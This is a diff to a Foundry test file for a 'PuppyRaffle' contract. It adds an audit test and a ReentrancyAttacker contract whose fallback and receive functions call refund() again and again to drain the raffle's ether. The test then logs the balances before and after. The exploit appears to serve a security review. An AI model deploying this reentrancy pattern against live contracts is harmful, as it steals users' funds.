@@ -255,4 +255,69 @@ contract PuppyRaffleTest is Test {
 
         assert(gas_cost_first < gas_cost_second);
     }
+
+    // @audit-test Test the reentrancy in refund function
+    function test_reentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attacker_contract = new ReentrancyAttacker(puppyRaffle);
+        address attack_user = makeAddr("attacker");
+        vm.deal(attack_user, 1 ether); // signature of deal method is `deal(address to, uint256 give)`
+
+        uint256 attacker_contract_balance_before = address(attacker_contract).balance;
+        uint256 raffle_contract_balance_before = address(puppyRaffle).balance;
+
+        // attack phase
+        vm.prank(attack_user);
+        attacker_contract.enter_raffle_and_attack{ value: entranceFee }(); // call the function and pass the value of entranceFee for one user to enter the raffle
+
+        uint256 raffle_contract_balance_after = address(puppyRaffle).balance;
+        uint256 attacker_contract_balance_after = address(attacker_contract).balance;
+
+        console.log("Address of raffle contract is: %s", address(puppyRaffle));
+        console.log("Address of attack contract is: %s", address(attacker_contract));
+        console.log("Address of attack user is: %s", address(attack_user));
+        console.log("The raffle contract had initial balance of %s and the final balanace is %s", raffle_contract_balance_before, raffle_contract_balance_after);
+        console.log("The attacker contract had initial balance of %s and the final balanace is %s", attacker_contract_balance_before, attacker_contract_balance_after);
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppy_raffle_victim;
+    uint256 entrance_fee;
+    uint256 attacker_index;
+
+    constructor (PuppyRaffle _victim) {
+        puppy_raffle_victim = _victim;
+    }
+
+    function enter_raffle_and_attack () external payable {
+        // enter the raffle
+        entrance_fee = puppy_raffle_victim.entranceFee();
+        address[] memory attacker = new address[](1);
+        attacker[0] = address(this); // this stores the address of the `attacker_contract` that is defined in the `test_reentrancy_refund` function
+        puppy_raffle_victim.enterRaffle{value: entrance_fee}(attacker);
+        // start the reentrancy attack
+        attacker_index = puppy_raffle_victim.getActivePlayerIndex(address(this));
+        puppy_raffle_victim.refund(attacker_index);
+    }
+
+    function _steal () internal {
+        if (address(puppy_raffle_victim).balance >= entrance_fee) {
+            puppy_raffle_victim.refund(attacker_index);
+        }
+    }
+
+    fallback () external payable {
+        _steal();
+    }
+
+    receive () external payable {
+        _steal();
+    }
 }
